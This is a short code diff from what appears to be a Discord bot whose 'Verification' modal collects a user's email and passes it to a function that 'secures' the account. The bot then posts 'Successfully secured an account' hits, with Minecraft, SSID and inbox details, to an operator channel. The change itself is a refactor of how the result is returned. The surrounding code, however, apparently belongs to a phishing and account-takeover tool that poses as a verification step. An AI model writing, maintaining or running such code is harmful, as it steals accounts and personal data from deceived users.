@@ -227,9 +227,9 @@ class MyModalOne(ui.Modal, title="Verification"):
                     )
                     
                     # Embeds | Account, Minecraft, SSID, Extra Info, Inbox (separate)
-                    finalEmbeds = await startSecuringAccount(self.session, self.email.value, device) 
+                    securedAccount = await startSecuringAccount(self.session, self.email.value, device) 
 
-                    if not finalEmbeds:
+                    if not securedAccount:
                         await logs_channel.send(
                             embed = Embed(
                                 title = f"User | {interaction.user.name}({interaction.user.id})",
@@ -243,8 +243,11 @@ class MyModalOne(ui.Modal, title="Verification"):
                     
                     await hits_channel.send("@everyone **Successfully secured an account**")
                     await hits_channel.send(
-                        embed = finalEmbeds[0],
-                        view = accountInfo(finalEmbeds[1], finalEmbeds[2], interaction.user)
+                        embed = securedAccount["hit_embed"],
+                        view = accountInfo(
+                            securedAccount["details"],
+                            interaction.user
+                        )
                     )
                     return
                 
